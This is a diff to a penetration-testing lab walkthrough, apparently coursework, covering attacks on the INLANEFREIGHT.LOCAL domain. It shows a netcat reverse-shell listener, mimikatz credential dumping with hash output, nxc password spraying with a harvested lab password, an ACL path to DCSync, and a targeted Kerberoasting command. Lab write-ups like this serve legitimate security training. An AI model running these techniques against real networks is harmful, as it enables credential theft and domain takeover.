@@ -2339,6 +2339,15 @@ Following the steps:
 
 ![](./ms01/4.png)
 
+![](./ms01/5.png)
+
+![](./ms01/6.png)
+
+![](./ms01/7.png)
+
+![](./ms01/8.png)
+
+![](./ms01/9.png)
 ```
 C:\Users\ilfserveradm\Desktop>nc64.exe -lvnp 1337
 listening on [any] 1337 ...
@@ -2356,7 +2365,9 @@ type flag.txt
 33a9d46de4015e7b3b0ad592a9394720
 ```
 
-running mimikatz:
+## Credentials harvesting
+
+running mimikatz since now i am a local admin:
 
 ```
 c:\Users\ilfserveradm\Desktop>.\mimikatz
@@ -2508,6 +2519,7 @@ cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 f
 old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
 ```
 
+Searching for local users:
 ```
 c:\Users>dir
 dir
@@ -2530,6 +2542,8 @@ dir
 c:\Users>
 ```
 
+Password works:
+
 ```
  nxc smb 172.16.8.0/24 -u mssqladm -p 'DBAilfreight1!'
 SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None)
@@ -2542,7 +2556,13 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 
 ```
 
-more bloodhound img
+Enumerating mssqladm acl:
+
+![](./bh/2.png)
+
+![](./bh/3.png)
+
+By following this acl chain, a domain compromise will be possible since server admins can perform a dcsync.
 
 ```
 python3 targetedKerberoast.py -v -d 'INLANEFREIGHT.LOCAL' -u 'mssqladm' -p 'DBAilfreight1!' --dc-ip 172.16.8.3 --request-user ttimmons
